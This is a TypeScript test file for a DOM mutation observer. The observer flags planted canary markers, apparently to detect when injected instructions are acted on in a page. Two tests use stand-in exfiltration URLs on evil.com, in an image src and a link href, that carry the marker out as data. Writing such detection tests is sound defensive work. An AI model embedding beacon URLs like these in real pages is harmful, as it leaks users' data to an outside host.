import { describe, it, expect, vi, afterEach } from 'vitest';
import { observeMutations, MutationEvent } from '../../src/observe/mutation';

describe('observeMutations', () => {
  let cleanupFn: (() => void) | null = null;

  afterEach(() => {
    if (cleanupFn) {
      cleanupFn();
      cleanupFn = null;
    }
  });

  it('returns a cleanup function', () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_test123'], onEvent);
    expect(typeof cleanupFn).toBe('function');
  });

  it('fires callback when marker appears in text content of added node', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_test123'], onEvent);

    const div = document.createElement('div');
    div.textContent = 'Response contains cnry_test123';
    document.body.appendChild(div);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event.matchedMarker).toBe('cnry_test123');
    expect(event.type).toBe('childList');
  });

  it('fires callback when marker appears in attribute value of added node', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_attr456'], onEvent);

    const div = document.createElement('div');
    div.setAttribute('data-canarai-instruction', 'value contains cnry_attr456');
    document.body.appendChild(div);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event.matchedMarker).toBe('cnry_attr456');
  });

  it('fires callback when marker appears in characterData change', async () => {
    const onEvent = vi.fn();
    const textNode = document.createTextNode('initial text');
    document.body.appendChild(textNode);

    // Wait for the initial mutation to be processed
    await new Promise(resolve => setTimeout(resolve, 0));

    cleanupFn = observeMutations(['cnry_char789'], onEvent);
    textNode.textContent = 'updated text with cnry_char789';

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event.matchedMarker).toBe('cnry_char789');
    expect(event.type).toBe('characterData');
  });

  it('does not fire callback when no markers match', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_nomatch'], onEvent);

    const div = document.createElement('div');
    div.textContent = 'This text has no matching markers';
    document.body.appendChild(div);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).not.toHaveBeenCalled();
  });

  it('cleanup disconnects observer — no events after cleanup', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_cleanup'], onEvent);
    cleanupFn();
    cleanupFn = null;

    const div = document.createElement('div');
    div.textContent = 'This contains cnry_cleanup but observer is disconnected';
    document.body.appendChild(div);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).not.toHaveBeenCalled();
  });

  it('returns no-op function for empty markers array', () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations([], onEvent);
    expect(typeof cleanupFn).toBe('function');
    // Should not throw
    cleanupFn();
    cleanupFn = null;
  });

  it('event has correct structure with type, timestamp, targetSelector, detail, matchedMarker', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_struct'], onEvent);

    const div = document.createElement('div');
    div.id = 'test-node';
    div.textContent = 'Content referencing cnry_struct here';
    document.body.appendChild(div);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event).toHaveProperty('type');
    expect(event).toHaveProperty('timestamp');
    expect(event).toHaveProperty('targetSelector');
    expect(event).toHaveProperty('detail');
    expect(event).toHaveProperty('matchedMarker');
    expect(typeof event.timestamp).toBe('number');
    expect(event.matchedMarker).toBe('cnry_struct');
  });

  it('detects markers in multiple added nodes', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_multi1', 'cnry_multi2'], onEvent);

    const div1 = document.createElement('div');
    div1.textContent = 'First cnry_multi1';
    const div2 = document.createElement('div');
    div2.textContent = 'Second cnry_multi2';
    document.body.appendChild(div1);
    document.body.appendChild(div2);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalledTimes(2);
  });

  it('fires callback for marker in src attribute of added element', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_src123'], onEvent);

    const img = document.createElement('img');
    img.setAttribute('src', 'https://evil.com/steal?data=cnry_src123');
    document.body.appendChild(img);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event.matchedMarker).toBe('cnry_src123');
  });

  it('fires callback for marker in href attribute of added element', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_href123'], onEvent);

    const a = document.createElement('a');
    a.setAttribute('href', 'https://evil.com/page?q=cnry_href123');
    document.body.appendChild(a);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event.matchedMarker).toBe('cnry_href123');
  });

  it('handles attribute changes on existing elements with markers', async () => {
    const div = document.createElement('div');
    document.body.appendChild(div);

    await new Promise(resolve => setTimeout(resolve, 0));

    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_attrchange'], onEvent);

    div.setAttribute('src', 'https://example.com/cnry_attrchange');

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event.type).toBe('attributes');
    expect(event.matchedMarker).toBe('cnry_attrchange');
  });

  it('selector includes tag name and id', async () => {
    const onEvent = vi.fn();
    cleanupFn = observeMutations(['cnry_sel123'], onEvent);

    const div = document.createElement('div');
    div.id = 'my-node';
    div.className = 'my-class';
    div.textContent = 'cnry_sel123';
    document.body.appendChild(div);

    await new Promise(resolve => setTimeout(resolve, 0));
    expect(onEvent).toHaveBeenCalled();
    const event: MutationEvent = onEvent.mock.calls[0][0];
    expect(event.targetSelector).toContain('div');
    expect(event.targetSelector).toContain('#my-node');
  });
});
